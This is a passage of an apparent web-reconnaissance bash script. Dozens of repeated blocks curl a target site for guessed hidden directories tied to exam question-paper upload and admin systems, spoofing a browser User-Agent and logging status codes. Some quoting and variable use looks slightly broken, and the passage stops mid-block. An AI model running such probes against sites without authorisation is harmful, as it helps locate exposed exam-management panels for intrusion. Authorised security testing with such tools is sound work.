echo -n "Payload ["Admin_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
